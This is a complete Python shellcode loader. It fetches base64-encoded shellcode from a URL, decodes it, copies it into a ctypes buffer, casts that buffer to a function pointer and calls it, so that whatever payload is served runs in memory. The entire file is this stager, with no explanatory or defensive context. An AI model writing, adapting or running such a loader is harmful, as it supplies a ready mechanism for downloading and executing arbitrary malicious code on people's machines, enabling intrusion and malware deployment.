import ctypes
import base64
import urllib.request

# Shellcode source URL
url = "http://localhost:8000/shellcode.bin"

# Fetch the base64-encoded shellcode
try:
    with urllib.request.urlopen(url) as response:
        encoded_shellcode = response.read()
except Exception as e:
    print(f"[!] Failed to retrieve shellcode: {e}")
    exit(1)

# Decode base64 shellcode to raw bytes
try:
    shellcode = base64.b64decode(encoded_shellcode)
except Exception as e:
    print(f"[!] Failed to decode shellcode: {e}")
    exit(1)

# Allocate buffer for shellcode
shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))

# Create function pointer to the shellcode buffer
shell_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))

# Execute the shellcode
print("[*] Executing shellcode...")
shell_func()
